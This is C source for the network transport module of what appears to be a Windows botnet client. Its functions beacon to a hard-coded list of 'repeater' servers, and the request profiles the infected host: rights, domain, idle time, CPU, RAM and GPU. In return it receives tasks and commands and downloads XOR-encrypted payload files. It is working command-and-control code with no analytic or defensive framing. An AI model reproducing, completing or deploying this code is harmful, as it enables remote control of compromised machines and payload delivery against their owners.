#include "transport.h"

PWCHAR REPEATER_IP[] = {REPEATER_LIST};


LPVOID TCPRequest(
    PWCHAR pwszHost,
    USHORT nPort,
    INT nTimeOut,
    LPVOID lpRequest,
    DWORD dwRequest,
    LPDWORD lpdwResult
)
{
    WSADATA wsa;
    ADDRINFO ai;
    fd_set Write;
    fd_set Err;
    TIMEVAL timeout;
    HRESULT hr = S_OK;
    SOCKET hSock = INVALID_SOCKET;
    LPADDRINFO pai = NULL;
    LPVOID lpResponse = NULL;
    PWCHAR pwszPort = NULL;
    DWORD dwBytesSent = 0;
    DWORD dwBytesRecv = 0;
    INT nSend = 0;
    INT nRead = 0;
    ULONG ulMode = 1;
    BOOL bRecvLimit = FALSE;

    if (pwszHost == NULL || nPort == 0)
    {
        goto cleanup;
    }

    if (pwszHost[0] == 0)
    {
        goto cleanup;
    }

    if (WSAStartup(0x202, &wsa) != 0)
    {
        goto cleanup;
    }

    pwszPort = (PWCHAR)MemoryAllocate(NULL, (6 * sizeof(WCHAR)));
    if (pwszPort == NULL)
    {
        goto cleanup;
    }

    hr = StringCbPrintfW(pwszPort, MemorySize(pwszPort), L"%d", nPort);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    SecureZeroMemory(&ai, sizeof(ADDRINFO));
    ai.ai_family = AF_UNSPEC;
    ai.ai_socktype = SOCK_STREAM;
    ai.ai_protocol = IPPROTO_TCP;

    if (GetAddrInfoW(pwszHost, pwszPort, &ai, &pai) != 0)
    {
        goto cleanup;
    }

    hSock = socket(pai->ai_family, pai->ai_socktype, pai->ai_protocol);
    if (hSock == INVALID_SOCKET)
    {
        goto cleanup;
    }

    if (setsockopt(hSock, SOL_SOCKET, SO_RCVTIMEO, (PCHAR)&nTimeOut, sizeof(INT)) == SOCKET_ERROR)
    {
        goto cleanup;
    }

    if (ioctlsocket(hSock, FIONBIO, &ulMode) == SOCKET_ERROR)
    {
        goto cleanup;
    }

    if (connect(hSock, pai->ai_addr, pai->ai_addrlen) == SOCKET_ERROR && WSAGetLastError() != WSAEWOULDBLOCK)
    {
        goto cleanup;
    }

    ulMode = 0;

    if (ioctlsocket(hSock, FIONBIO, &ulMode) == SOCKET_ERROR)
    {
        goto cleanup;
    }

    FD_ZERO(&Write);
    FD_ZERO(&Err);
    FD_SET(hSock, &Write);
    FD_SET(hSock, &Err);

    SecureZeroMemory(&timeout, sizeof(TIMEVAL));
    timeout.tv_sec = CONNECT_TIMEOUT;
    timeout.tv_usec = 0;

    if (select(0, NULL, &Write, &Err, &timeout)  == SOCKET_ERROR)
    {
        goto cleanup;
    }

    if (!FD_ISSET(hSock, &Write))
    {
        if (lpRequest == NULL && dwRequest == 0 && lpdwResult != NULL)
        {
            *lpdwResult = 1;
            goto cleanup;
        }

        goto cleanup;
    }
    else
    {
        if (lpRequest == NULL && dwRequest == 0 && lpdwResult != NULL)
        {
            *lpdwResult = 2;
            goto cleanup;
        }
    }

    do
    {
        nSend = send(hSock, lpRequest + dwBytesSent, dwRequest - dwBytesSent, 0);
        if (nSend == SOCKET_ERROR)
        {
            goto cleanup;
        }

        dwBytesSent = dwBytesSent + nSend;
    }
    while (dwBytesSent < dwRequest);

    if (lpdwResult != NULL)
    {
        if (*lpdwResult > 0)
        {
            bRecvLimit = TRUE;
        }
    }

    lpResponse = MemoryAllocate(NULL, bRecvLimit ? *lpdwResult : MAX_FRAME_SIZE);
    if (lpResponse == NULL)
    {
        goto cleanup;
    }

    for (;;)
    {
        nRead = recv(hSock, lpResponse + dwBytesRecv, bRecvLimit ? (MemorySize(lpResponse) - dwBytesRecv) : MAX_FRAME_SIZE, 0);
        if (nRead > 0)
        {
            dwBytesRecv = dwBytesRecv + nRead;

            if (bRecvLimit)
            {
                if (*lpdwResult <= dwBytesRecv)
                {
                    break;
                }
            }
            else
            {
                lpResponse = MemoryAllocate(lpResponse, dwBytesRecv + MAX_FRAME_SIZE);
                if (lpResponse == NULL)
                {
                    MemoryFree(lpResponse) ? lpResponse = NULL : 0;
                    goto cleanup;
                }
            }
        }
        else if (nRead == 0 && dwBytesRecv > 0)
        {
            break;
        }
        else if ((nRead == SOCKET_ERROR && WSAGetLastError() == WSAETIMEDOUT) && dwBytesRecv > 0)
        {
            break;
        }
        else
        {
            MemoryFree(lpResponse) ? lpResponse = NULL : 0;
            goto cleanup;
        }
    }

    if (MemorySize(lpResponse) != dwBytesRecv)
    {
        lpResponse = MemoryAllocate(lpResponse, dwBytesRecv);
        if (lpResponse == NULL)
        {
            MemoryFree(lpResponse) ? lpResponse = NULL : 0;
            goto cleanup;
        }
    }

    if (lpdwResult != NULL)
    {
        *lpdwResult = dwBytesRecv;
    }

cleanup:
    if (pwszPort != NULL) MemoryFree(pwszPort);
    if (pai != NULL) FreeAddrInfoW(pai);
    if (hSock != INVALID_SOCKET)
    {
        shutdown(hSock, SD_BOTH);
        closesocket(hSock);
    }

    return lpResponse;
}


BOOL GetTask(
    DWORD dwID,
    DWORD dwNAT,
    DWORD dwDomain,
    DWORD dwUptime,
    DWORD dwLastInput,
    DWORD dwOS,
    DWORD dwRights,
    DWORD dwCapacity,
    DWORD dwProcNumber,
    DWORD dwProc,
    DWORD dwRAM,
    DWORD dwGPU,
    DWORD dwVersion,
    PWCHAR pwszGroup,
    LPDWORD lpdwTask,
    LPDWORD lpdwCommand,
    PWCHAR pwszFile
)
{
    HRESULT hr = S_OK;
    PBOT_REQUEST pbr = NULL;
    PBOT_RESPONSE pbs = NULL;
    PWCHAR pwszTemp = NULL;
    PCHAR pszGroup = NULL;
    SIZE_T nStringLen = 0;
    DWORD dwServerCnt = 0;
    DWORD dwRetryCnt = 0;
    DWORD dwResponse = sizeof(BOT_RESPONSE);
    BOOL bRet = FALSE;

    if (pwszGroup == NULL || lpdwTask == NULL || lpdwCommand == NULL || pwszFile == NULL)
    {
        goto cleanup;
    }

    if (pwszGroup[0] == 0)
    {
        goto cleanup;
    }

    pbr = (PBOT_REQUEST)MemoryAllocate(NULL, sizeof(BOT_REQUEST));
    if (pbr == NULL)
    {
        goto cleanup;
    }

    pbr->dwMagic = MAGIC_BOT_REQUEST;
    pbr->dwID = dwID;
    pbr->dwNAT = dwNAT;
    pbr->dwDomain = dwDomain;
    pbr->dwUptime = dwUptime;
    pbr->dwLastInput = dwLastInput;
    pbr->dwOS = dwOS;
    pbr->dwRights = dwRights;
    pbr->dwCapacity = dwCapacity;
    pbr->dwProcNumber = dwProcNumber;
    pbr->dwProc = dwProc;
    pbr->dwRAM = dwRAM;
    pbr->dwGPU = dwGPU;
    pbr->dwVersion = dwVersion;
    pbr->dwTask = *lpdwTask;

    pszGroup = (PCHAR)UnicodeToAscii(pwszGroup);
    if (pszGroup == NULL)
    {
        goto cleanup;
    }

    hr = StringCchLengthA(pszGroup, STRSAFE_MAX_CCH, &nStringLen);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    if (nStringLen >= sizeof(pbr->szGroup))
    {
        goto cleanup;
    }

    hr = StringCbPrintfA(pbr->szGroup, sizeof(pbr->szGroup), "%s", pszGroup);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    if (!XorData(pbr->szGroup, sizeof(pbr->szGroup) / sizeof(DWORD), pbr->dwMagic))
    {
        goto cleanup;
    }

    for (dwServerCnt = 0; dwServerCnt < (sizeof (REPEATER_IP) / sizeof (REPEATER_IP[0])); dwServerCnt++)
    {
        for (dwRetryCnt = 0; dwRetryCnt < NUM_RETRY_CONNECT; dwRetryCnt++)
        {
            pbs = TCPRequest(REPEATER_IP[dwServerCnt], REPEATER_PORT, TASK_TIMEOUT, pbr, MemorySize(pbr), &dwResponse);
            if (pbs != NULL)
            {
                if (pbs->dwMagic == MAGIC_BOT_RESPONSE)
                {
                    if (!XorData(pbs->szFile, sizeof(pbs->szFile) / sizeof(DWORD), pbs->dwMagic))
                    {
                        goto cleanup;
                    }

                    hr = StringCchLengthA(pbs->szFile, STRSAFE_MAX_CCH, &nStringLen);
                    if (FAILED(hr))
                    {
                        goto cleanup;
                    }

                    if (nStringLen >= (MemorySize(pwszFile) / sizeof(WCHAR)))
                    {
                        goto cleanup;
                    }

                    pwszTemp = (PWCHAR)AsciiToUnicode(pbs->szFile);
                    if (pwszTemp == NULL)
                    {
                        goto cleanup;
                    }

                    hr = StringCbPrintfW(pwszFile, MemorySize(pwszFile), L"%ls", pwszTemp);
                    if (FAILED(hr))
                    {
                        goto cleanup;
                    }

                    *lpdwTask = pbs->dwTask;
                    *lpdwCommand = pbs->dwCommand;

                    bRet = TRUE;
                    goto cleanup;
                }

                dwResponse = sizeof(BOT_RESPONSE);
                MemoryFree(pbs) ? pbs = NULL : 0;
            }

            Sleep(RETRY_CONNECT_TIME);
        }
    }

cleanup:
    if (pbr != NULL) MemoryFree(pbr);
    if (pbs != NULL) MemoryFree(pbs);
    if (pszGroup != NULL) MemoryFree(pszGroup);
    if (pwszTemp != NULL) MemoryFree(pwszTemp);

    return bRet;
}


LPVOID DownloadFile(
    PWCHAR pwszFileName,
    LPDWORD lpdwFile
)
{
    HRESULT hr = S_OK;
    PFILE_REQUEST pfr = NULL;
    PFILE_RESPONSE pfs = NULL;
    PCHAR pszFileName = NULL;
    LPVOID lpFile = NULL;
    SIZE_T nStringLen = 0;
    DWORD dwServerCnt = 0;
    DWORD dwRetryCnt = 0;
    DWORD dwResponse = 0;

    if (pwszFileName == NULL)
    {
        goto cleanup;
    }

    if (pwszFileName[0] == 0)
    {
        goto cleanup;
    }

    pfr = (PFILE_REQUEST)MemoryAllocate(NULL, sizeof(FILE_REQUEST));
    if (pfr == NULL)
    {
        goto cleanup;
    }

    pszFileName = (PCHAR)UnicodeToAscii(pwszFileName);
    if (pszFileName == NULL)
    {
        goto cleanup;
    }

    hr = StringCchLengthA(pszFileName, STRSAFE_MAX_CCH, &nStringLen);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    if (nStringLen >= sizeof(pfr->szFileName))
    {
        goto cleanup;
    }

    pfr->dwMagic = MAGIC_FILE_REQUEST;

    hr = StringCbPrintfA(pfr->szFileName, sizeof(pfr->szFileName), "%s", pszFileName);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    if (!XorData(pfr->szFileName, sizeof(pfr->szFileName) / sizeof(DWORD), pfr->dwMagic))
    {
        goto cleanup;
    }

    for (dwServerCnt = 0; dwServerCnt < (sizeof (REPEATER_IP) / sizeof (REPEATER_IP[0])); dwServerCnt++)
    {
        for (dwRetryCnt = 0; dwRetryCnt < NUM_RETRY_CONNECT; dwRetryCnt++)
        {
            pfs = TCPRequest(REPEATER_IP[dwServerCnt], FILESERVER_PORT, DOWNLOAD_TIMEOUT, pfr, MemorySize(pfr), &dwResponse);
            if (pfs != NULL)
            {
                if (pfs->dwMagic == MAGIC_FILE_RESPONSE)
                {
                    if (pfs->dwSize == 0 || pfs->dwCRC32 == 0)
                    {
                        goto cleanup;
                    }

                    if (pfs->dwSize <= (dwResponse - sizeof(FILE_RESPONSE)))
                    {
                        if (XorData((LPVOID)pfs + sizeof(FILE_RESPONSE), pfs->dwSize / sizeof(DWORD), DECRYPT_KEY))
                        {
                            if (Generate_CRC32((LPVOID)pfs + sizeof(FILE_RESPONSE), pfs->dwSize) == pfs->dwCRC32)
                            {
                                lpFile = MemoryAllocate(NULL, pfs->dwSize);
                                if (lpFile != NULL)
                                {
                                    CopyMemory(lpFile, (LPVOID)pfs + sizeof(FILE_RESPONSE), pfs->dwSize);

                                    if (lpdwFile != NULL)
                                    {
                                        *lpdwFile = pfs->dwSize;
                                    }

                                    goto cleanup;
                                }
                            }
                        }
                    }
                }

                dwResponse = 0;
                MemoryFree(pfs) ? pfs = NULL : 0;
            }

            Sleep(RETRY_CONNECT_TIME);
        }
    }

cleanup:
    if (pfr != NULL) MemoryFree(pfr);
    if (pfs != NULL) MemoryFree(pfs);
    if (pszFileName != NULL) MemoryFree(pszFileName);

    return lpFile;
}


VOID TELEMETRY(
    DWORD dwID,
    DWORD dwVersion,
    DWORD dwString,
    DWORD dwError,
    PCHAR pszModule,
    PCHAR pszFile
)
{
    if (pszModule == NULL || pszFile == NULL)
    {
        return;
    }

    if (pszModule[0] == 0 || pszFile[0] == 0)
    {
        return;
    }

#ifdef CONSOLE_APP
    printf("[%s] ERROR - 0x%08X, FILE - %s:%d\n", pszModule, dwError, pszFile, dwString);
# else
#ifdef _DEBUG
    CHAR szDebugOutput[1024];

    StringCbPrintfA(&szDebugOutput, sizeof(szDebugOutput), "[%s] ERROR - 0x%08X, FILE - %s:%d", pszModule, dwError, pszFile, dwString);
    OutputDebugStringA(szDebugOutput);
#else
    HRESULT hr = S_OK;
    PTELEMETRY_REQUEST ptr = NULL;
    PTELEMETRY_RESPONSE pts = NULL;
    SIZE_T nStringLen = 0;
    DWORD dwServerCnt = 0;
    DWORD dwRetryCnt = 0;
    DWORD dwResponse = sizeof(TELEMETRY_RESPONSE);

    ptr = (PTELEMETRY_REQUEST)MemoryAllocate(NULL, sizeof(TELEMETRY_REQUEST));
    if (ptr == NULL)
    {
        goto cleanup;
    }

    ptr->dwMagic = MAGIC_TELEMETRY_REQUEST;
    ptr->dwID = dwID;
    ptr->dwVersion = dwVersion;
    ptr->dwString = dwString;
    ptr->dwError = dwError;

    hr = StringCchLengthA(pszModule, STRSAFE_MAX_CCH, &nStringLen);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    if (nStringLen >= sizeof(ptr->szModule))
    {
        goto cleanup;
    }

    hr = StringCbPrintfA(ptr->szModule, sizeof(ptr->szModule), "%s", pszModule);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    hr = StringCchLengthA(pszFile, STRSAFE_MAX_CCH, &nStringLen);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    if (nStringLen >= sizeof(ptr->szFile))
    {
        goto cleanup;
    }

    hr = StringCbPrintfA(ptr->szFile, sizeof(ptr->szFile), "%s", pszFile);
    if (FAILED(hr))
    {
        goto cleanup;
    }

    if (!XorData(ptr->szModule, sizeof(ptr->szModule) / sizeof(DWORD), ptr->dwMagic))
    {
        goto cleanup;
    }

    if (!XorData(ptr->szFile, sizeof(ptr->szFile) / sizeof(DWORD), ptr->dwMagic))
    {
        goto cleanup;
    }

    for (dwServerCnt = 0; dwServerCnt < (sizeof (REPEATER_IP) / sizeof (REPEATER_IP[0])); dwServerCnt++)
    {
        for (dwRetryCnt = 0; dwRetryCnt < NUM_RETRY_CONNECT; dwRetryCnt++)
        {
            pts = TCPRequest(REPEATER_IP[dwServerCnt], TELEMETRY_PORT, TELEMETRY_TIMEOUT, ptr, MemorySize(ptr), &dwResponse);
            if (pts != NULL)
            {
                if (pts->dwMagic == MAGIC_TELEMETRY_RESPONSE)
                {
                    goto cleanup;
                }

                dwResponse = sizeof(TELEMETRY_RESPONSE);
                MemoryFree(pts) ? pts = NULL : 0;
            }

            Sleep(RETRY_CONNECT_TIME);
        }
    }

cleanup:
    if (ptr != NULL) MemoryFree(ptr);
    if (pts != NULL) MemoryFree(pts);
#endif
#endif

    return;
}